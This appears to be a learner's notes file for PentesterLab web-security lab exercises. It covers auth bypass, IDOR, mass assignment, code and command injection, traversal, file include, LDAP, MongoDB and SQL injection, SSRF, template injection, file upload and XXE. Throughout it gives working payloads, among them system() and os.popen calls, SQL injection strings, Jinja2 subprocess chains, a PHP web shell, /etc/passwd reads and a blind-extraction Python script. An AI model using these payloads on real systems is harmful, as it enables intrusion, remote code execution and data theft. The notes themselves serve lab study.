__________________________________________________________________

essentials
___________________________________________________________________


___________________________________________________________________

authentication
___________________________________________________________________



#1
guessable cookies

___________________________________________________________________


#2
md5 cookies

___________________________________________________________________

#3

the trick here comes from the fact that the comparison when you 
create a user is done programmatically (i.e.: in ruby) but when 
the user's details get retrieved, the comparison is done by the 
database. by default, mysql (with the type varchar) will perform 
a case insensitive comparison: "admin" and "admin" are the same 
value.
___________________________________________________________________

#4

this check can also be bypassed based on the way mysql performs 
string comparison: mysql ignores trailing spaces (i.e.: 
pentesterlab and pentesterlab[space] are equals). using the same 
method as above, you should be able to pretend to be logged in as 
the user admin.

a good way to prevent this issue is to tell the database that the 
username is a primary key. this method is, for example, used in 
tomcat documentation to use a sql backend as a realm.
___________________________________________________________________

#5

here the issue comes from the way the user gets redirected back 
to the login page. the developer forgot to stop the execution 
after redirecting users to the login page. by carefully 
inspecting the responses sent back by the server, you should be 
able to get the key.
___________________________________________________________________





















___________________________________________________________________

authorization
___________________________________________________________________

#1

once you are logged in, you can start accessing information and 
see the pattern used: /infos/1, /infos/2. if you keep 
incrementing the number in the url, you can access information 
from the other users.
___________________________________________________________________

#2

in this example, you can access the information using a method 
similar to the one seen previously. you cannot just directly 
access the information, however you can see that you are now able 
to edit information, and you can use this feature to access 
information from other users just by incrementing the number in 
the url.
___________________________________________________________________

#3

in this example, you can see an example of a classic mistake with 
modern frameworks. here most of the code is generated 
automatically and access to different formats (html, json) for 
the same database record is also done automatically.

for example, by accessing /users/1, you will see an html page 
with the first user's details. however the scoring key has been 
masked.

fortunately, you should be able to access the json representation 
of this user's details by modifying the url.
___________________________________________________________________

#4

object-relational mapping (orm)
for example, in ruby (using activerecord):
@user = user.find_by_name('pentesterlab')
@user = user.create(myhash)
[...]
@user.update_attributes(anotherhash)

unfortunately, this useful feature comes with a security price, 
if a developer did not correctly ensure that attributes of the 
object @user were protected, an attacker could arbitrary 
overwrite any of these attributes. in this section, we will see 
some common examples of these types of issues: mass-assignment.

in this example, you can register a user.
the application has two levels of privileges:

    user.
    admin.

the admin privilege is set using the attribute admin on the 
object user. if you look closely at the format used by the web 
application: user[username] and user[password], you should be 
able to find a way to get admin access. three methods can be used:

    modify the page directly using a browser extension.
    save the page and modify offline to create a page that will 
send the right payload to the right url.
    use a proxy to intercept the legitimate request and add your 
parameter (fastest option).

> user[admin]=true
___________________________________________________________________

#4

> user[admin]=
> user[admin]=1
___________________________________________________________________

#6

by convention (can be changed programmatically) when a developer 
uses activerecord (ruby-on-rails' most common data mapper), and a 
class organisation has multiple user, the relation is managed 
using a field organisation_id inside the user class:

the following code is used in ruby:

class user < activerecord::base
  belongs_to :organisation
end

class organisation < activerecord::base
  has_many :users
end

you can guess the fact that organisation is used by visiting the 
organisation page and looking at the url. you will see that the 
class is probably named organisation. and therefore the key in 
the users table is likely to be organisation_id.

ruby-on-rails enforces "convention" over "configuration" which 
really helps to guess class names and attributes' name...

using this information, you should be able to set your current 
organisation to get access to the "key".

> user[organisation_id]=1
___________________________________________________________________


























___________________________________________________________________

code execution
___________________________________________________________________

 it's always handy to know how to comment out the rest of the 
code (i.e.: the suffix that the application will add to the 
user-controlled data). in php, you can use // to get rid of the 
code added by the application.

as with sql injection, you can use the same value technique to 
test and ensure you have a code injection:

    by using comments and injecting /* random value */.
    by injecting a simple concatenation "." (where " are used to 
break the syntax and reform it correctly).
    by replacing the parameter you provided by a string 
concatenation, for example "."ha"."cker"." instead of hacker.

if you inject a single quote, nothing happens. however, you can 
get a better idea of the problem by injecting a double quote.

how does string concatenation work ??
___________________________________________________________________

#1

libcurl.so/?name=".system('ls');$a="
libcurl.so/?name=".system('ls');//"
libcurl.so/?name=".system('ls');#"     > not working
___________________________________________________________________

#2

(inspired by code execution in phpmyadmin)

when ordering information, developers can use two methods:

    order by in a sql request;
    usort in php code.

the function usort is often used with the function 
create_function to dynamically generate the "sorting" function, 
based on user-controlled information. if the web application 
lacks potent filtering and validation, this can lead to code 
execution.

> ?order=id);}system('uname%20-a');//
___________________________________________________________________

#3

pcre_replace_eval has been deprecated as of php 5.5.0 and removed 
in 7.0.0

https://www.php.net/manual/en/function.preg-replace.php
https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php

libcurl.so/?new=system("ls")&pattern=/asdf/e&base=hello asdf
___________________________________________________________________

#4

assert: when used incorrectly, this function will evaluate the 
value received

libcurl.so/?name=hacker'.system('ls').'
___________________________________________________________________

#5

@message = eval "\"hello "+params['username']+"\""

why does this work?:
libcurl.so/?username=<br>"%2b`ls`%2b"

and not this?:
libcurl.so/?username=<br>"+`ls`+"

because + is url encoded as a space
___________________________________________________________________

#6

libcurl.so/hello/" + "a" + "

how do we know it's python?:
"%2bstr(true)%2b"test.

libcurl.so/hello/"%2bstr(os.system('id'))%2b"
it may also be valuable to get the value returned by the command. 
to do this, you can use: os.popen('[cmd]').read() instead of 
os.system('[cmd]')
___________________________________________________________________

#7

in the previous challenge, we made things a bit easier by 
importing os in the vulnerable application. however, we didn't 
for this challenge.

we can use the following syntax to load and run the system 
function: __import__('os').system(...

libcurl.so/hello/"%2b__import__('os').system('ls')%2b"		wrong
libcurl.so/hello/"%2b`__import__('os').system('id')`%2b"	right
libcurl.so/hello/"%2b`__import__('os').popen('ls').read()`%2b"
___________________________________________________________________

#8

since forward slashes are banned we first encode our payload to 
base64 and make the server decode it

libcurl.so/hello/"%2b__import__('os').popen(__import__('base64').de
codestring([base64encodedcommand])).read()%2b"
___________________________________________________________________

#9

perl-cgi

important points:

 - need to refresh, since javascript is taking parameters from 
url (#)
 - even if double quotes give errors single quotes might inject
 - don't use the same quotes to inject within the payload
 - what kind of concatenation works (. or +) gives you a good 
idea of what language is there
 - sometimes json data might not be visible since it can't be 
parsed, in that case look at the raw data

steps:
	go to devtools > network
	click on preserve logs
	look at the last request
	go to that end point and inject
___________________________________________________________________

























___________________________________________________________________

command execution
___________________________________________________________________

#1

command1 && command2 will run 2 if 1 succeeds.
command1 || command2 will run 2 if 1 fails.
command1 ; command2  will run 1 then 2.
command1 | command2  will run 1 and send output of 1 to 2

man ascii - for an ascii table
make sure amperands are url encoded
___________________________________________________________________

#2

in this case we can't even see the output but the command gets 
executed
http://ptl-4938c1df-399c9d4e.libcurl.so/?ip=`ls`
___________________________________________________________________

#3

http://ptl-4938c1df-399c9d4e.libcurl.so/?ip=$(ls)
___________________________________________________________________


























___________________________________________________________________

directory traversals
___________________________________________________________________

as with other vulnerabilities, you can use the "same value 
technique" to test for this type of issue. for example, if the 
path used by the application inside a parameter is 
/images/photo.jpg. you can try to access:

    /images/./photo.jpg: you should see the same file.
    /images/../photo.jpg: you should get an error.
    /images/../images/photo.jpg: you should see the same file 
again.
    /images/../images/photo.jpg: you should get an error 
(depending on the file system) or something weird is going on.

you can test: images/../../../../../../../../../../../etc/passwd, 
if you get the passwd file, the application is vulnerable. the 
good news is that you don't need to know the number of ../. if 
you put too many, it will still work.

if you have a directory traversal in windows, you will be able to 
access test/../../../file.txt, even if the directory test does 
not exist. this is not the case, on linux
___________________________________________________________________

#1

even if you know absolute path, you still have to traverse

libcurl.so/file.php?file=./file.php
libcurl.so/file.php?file=../../pentesterlab.key

linux=/etc/passwd
windows=boot.ini
___________________________________________________________________

#2

if (!(strstr($file,"/var/www/")))
	die();

libcurl.so/file.php?file=/var/www/../../pentesterlab.key
___________________________________________________________________

#3

null byte (php solved this since [5.3.4])

libcurl.so/file.php?file=../../../../../var/www/hacker.png%00
___________________________________________________________________

























___________________________________________________________________

file includes
___________________________________________________________________

in a lot of applications, developers need to include files to 
load classes or to share some templates between multiple web pages.

when a user-controlled parameter is used as part of a file name 
in a call to an including function (require, require_once, 
include or include_once in php for example)

file include vulnerabilities can also be used as a directory 
traversal to read arbitrary files. however, if the arbitrary code 
contains an opening php tag, the file will be interpreted as php 
code.


local file include: a local file is read and interpreted.
remote file include: a remote file is retrieved and interpreted.

by default, php disables loading of remote files, thanks to the 
configuration option: allow_url_include (php.ini)

https://assets.pentesterlab.com/test_include_system.txt
___________________________________________________________________

#1

libcurl.so/?page=intro.php'
libcurl.so/?page=https://google.com
libcurl.so/?page=
https://assets.pentesterlab.com/test_include_system.txt&c=ls

___________________________________________________________________

#2

get rid of the suffix (for lfi) using a null byte. for rfi, you 
can get rid of the suffix, by adding &blah= or ?blah= depending 
on your url (you can also use null byte in rfi).

php solved this type of bypass since the version (5.3.4)[
http://php.net/releases/5_3_4.php]

___________________________________________________________________






















___________________________________________________________________

ldap
___________________________________________________________________

#1

some ldap servers authorise null bind

to get the bind with 2 null values, you will need to completely remove this parameter from the query. if you keep something like username=&password= in the url, these values will not work, since they won't be null; instead, they will be empty.

this is an important check to perform on all login forms that you will test in the future, even if the backend is not ldap-based.
___________________________________________________________________

#2

ldap filters

(|(cn=[input1])(cn=[input2])) to get records matching [input1] or [input2]

 &: (&(cn=[input1])(userpassword=[input2])) to get records for which the cn matches [input1] and the password matches [input2].

as you can see, the boolean logic is located at the beginning of the filter. since you're likely to inject after it, it's not always possible (depending on the ldap server) to inject logic inside the filter, if it's just (cn=[input]).

ldap uses the wildcard * character very often, to match any values

as with other injections, we will need to remove anything added by the server-side code. we can get rid of the end of the filter, using a null byte (encoded as %00).

that the filter probably looks like:
(&(cn=[input1])(userpassword=hash[input2]))

ldap supports several formats: `{cleartext}`, `{md5}`, `{smd5}` (salted md5), `{sha}`, `{ssha}` (salted sha1), `{crypt}` for storing passwords.

since [input2] is hashed, we cannot use it to inject our payload. 

final payload:
(&(cn=`hacker)(cn=*))%00`)(userpassword=hash[input2]))

in most cases, ldap injection will allow only you to bypass authentication and authorisation checks. retrieving arbitrary data (as opposed to just getting more results) is often really challenging or impossible.
___________________________________________________________________

















___________________________________________________________________

mongodb
___________________________________________________________________

#1

first, by reading mongodb documentation you can find that the sql or 1=1 translates to || 1==1 (note the double =). then by poking around, you can see that a null byte will prevent mongodb from using the rest of the query. in some cases, you can also use the comments // or <!-- to comment out the end of the query.
___________________________________________________________________

#2

/?search=admin'%20%26%26%20this.password.match(/.*/)%00
/?search=admin'%20%26%26%20this.password.match(/zzzzz/)%00
/?search=admin'%20%26%26%20this.passwordzz.match(/.*/)%00:

blind injection

###################################################################
import requests

# xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx, where x can be [0-9a-f]

x = '-01234567890abcdef'
payload=''

while len(payload)!=36:
	for i in x:
		
		url='http://ptl-8e00bff4-c65e2d45.libcurl.so/?search=admin%27%20%26%26%20this.password.match(/^' + payload+i + '.*$/)%00'
		
		print(payload+i)

		r = requests.get(url)
		if '<tr><td><a href="?search=admin">admin</a></td></tr>' in r.text:
			payload = payload+i
			break

print(payload)
###################################################################
___________________________________________________________________

















___________________________________________________________________

open redirect
___________________________________________________________________

https://webhook.site

open redirect vulnerabilities allows you to redirect the victim to a malicious website. they are low impact vulnerabilities in most cases unless you can use them to leak oauth tokens.
___________________________________________________________________

#1

trivial
___________________________________________________________________

#2

in this challenge, the redirect url needs to start with /. the developer made the assumption that only a path/uri can start with /. however, it's possible to bypass this mechanism by using //. for this challenge, you may want to use another site than webhook.site as they don't automatically redirect http:// to https://. otherwise, you can use the https:// url for this exercise.
___________________________________________________________________

















___________________________________________________________________

sql injection
___________________________________________________________________

there are three different ways to echo information in a sql statement:

    using quotes: single quote or double quote.
    using back-ticks.
    directly.

the way information is echoed back, and even what separator is used, will decide the detection technique to use. however, you don't have this information, and you will need to try to guess it.

you will need to formulate hypotheses and try to verify them. that's why spending time poking around with these examples is so important.
___________________________________________________________________

#1

single quotes

' or 1=1 -- [space]
' or 1=1#
___________________________________________________________________

#2

double quotes

" or 1=1 -- [space]
___________________________________________________________________

#3

if multiple rows, considered invalid

' or 1=1 limit 1 -- 
___________________________________________________________________

#4 & #5

spaces are not allowed

'/**/or/**/1=1#

examples: (url encode within the proxy)
/**/ %00 %09 %0a %0d
___________________________________________________________________

#6

(*)(url encode within the proxy, otherwise it gets double encoded)
%bf%27 or 1=1 --

using the string \xbf' (url-encoded as %bf%27), it's possible to get a single quote that will not get escaped properly. it's therefore possible to inject an always-true condition using %bf%27 or 1=1 -- and bypass the authentication.

as a side note, this issue can be remediated by setting up the connection encoding to 'GBK' instead of using an SQL query (which is the source of this issue). here the problem comes from the execution of the following query:

SET CHARACTER SET 'GBK';

it is a pretty unlikely issue for a web application but it's always good to know that it exists, especially if you play CTFs.
___________________________________________________________________

















__________________________________________________________________

ssrf
__________________________________________________________________

get the server to make HTTP requests (or over protocols) on our behalf.

used to access internal pages, perform network scans, trigger behaviours in different systems...

here we will just try to retrieve the content of the webroot of a server listening on port TCP/1234. we can't access the service directly but we can get the vulnerable server to do it for us.

to do so you will need to change the url parameter to access the local server on port TCP/1234.

() remember to use http instead of https
__________________________________________________________________

#1

retrieve the key located at the root of the webserver listening on localhost on port TCP/1234.

libcurl.so/?url=http://localhost:1234/
__________________________________________________________________

#2

in this example, the developer blocked the previous attack by blacklisting 127.0.0.1. however, that's the only thing that is blocked. You should be able to find an alias for it.
libcurl.so/?url=http://localhost:1234/
__________________________________________________________________

#3

libcurl.so/?url=http://0.0.0.0:1234/
__________________________________________________________________

#4

http://asdf.hackingwithpentesterlab.com/

libcurl.so/?url=http://assets.pentesterlab.com.hackingwithpentesterlab.link:1234
__________________________________________________________________







__________________________________________________________________

server side template injection
__________________________________________________________________

Jinja2

in this exercise, the bug is located in the 404 error management.
how do we get to know that using black-box testing?

anyway, since it's 404, just append a random page to the url.
to check whether injection is possible, try:

{{}}
{{a}}
{{'a'}}
{{'7'*7}}
{{self}}
{{''.__class__.mro()[1].__subclasses__()}}
{{''.__class__.mro()[-1].__subclasses__()}}
{{''.__class__.mro()[2].__subclasses__()}}
{{''.__class__.mro()[2].__subclasses__()[233](['ls'])}}
{{''.__class__.mro()[2].__subclasses__()[233]("ls -l", shell=True,stdout=-1).communicate()[0]}}


subprocess.Popen(args, bufsize=0, executable=None, stdin=None, stdout=None, stderr=None, preexec_fn=None, close_fds=False, shell=False, cwd=None, env=None, universal_newlines=False, startupinfo=None, creationflags=0)
__________________________________________________________________

Twig

{{7*'7'}} => 49 in Twig, 7777777 in Jinja2
{{_self}}

{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('uname')}}
__________________________________________________________________



















__________________________________________________________________

file upload
__________________________________________________________________

#1

<?php
system($GET['c']);
?>
__________________________________________________________________

#2

file.php
file.pHp
file.php3

in this second example, the developer put a restriction on the file name. the file name cannot end with .php. to bypass this restriction, you can simply rename the file to .php3 for example (since the server will load file with this extension as PHP file).
__________________________________________________________________



















__________________________________________________________________

xml attacks
__________________________________________________________________

#1

<!DOCTYPE test [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<!DOCTYPE test [<!ENTITY x SYSTEM "file:///pentesterlab.key">]><test>%26x;</test>
__________________________________________________________________

#2















